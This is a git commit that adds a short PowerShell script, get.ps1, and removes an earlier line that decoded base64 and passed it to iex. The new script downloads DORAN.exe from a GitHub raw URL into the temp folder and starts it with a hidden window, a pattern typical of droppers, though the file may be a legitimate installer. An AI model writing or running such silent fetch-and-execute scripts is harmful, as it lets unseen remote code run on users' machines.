42d2f6e8132be602e62473f29c850d9dd404be90
learnaisimplified <learnaisimplified@gmail.com>
2025-07-21 18:24:14 +0800

    Add get.ps1

--- get.ps1
+++ get.ps1
@@ -1,1 +1,6 @@
-iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))
+# Download and run the compiled DORAN.exe from GitHub
+$exeUrl = "https://raw.githubusercontent.com/learnaisimplified/DORAN-Pro/main/dist/private/DORAN.exe"
+$tempExe = "$env:TEMP\DORAN.exe"
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing
+Start-Process -FilePath $tempExe -WindowStyle Hidden
